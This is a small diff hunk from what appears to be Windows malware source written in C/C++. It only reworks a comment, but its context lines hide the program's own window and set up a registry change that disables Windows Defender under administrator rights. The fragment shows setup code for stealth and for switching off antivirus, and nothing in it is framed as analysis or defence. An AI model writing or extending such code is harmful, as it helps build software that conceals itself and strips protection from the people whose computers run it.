@@ -18,7 +18,7 @@ int main() {
 	ShowWindow(executable, SW_HIDE);
 
 
-	// Disabling Windows - if you want to use this, you need to run the executable as administrator
+	// Disabling Windows Defender - if you want to use this, you need to run the executable as administrator
 	HKEY hkey;
 	DWORD disable = 0x00000001; // if you want to enable Windows Defender again change the value from 0x00000001 to 0x00000000
 
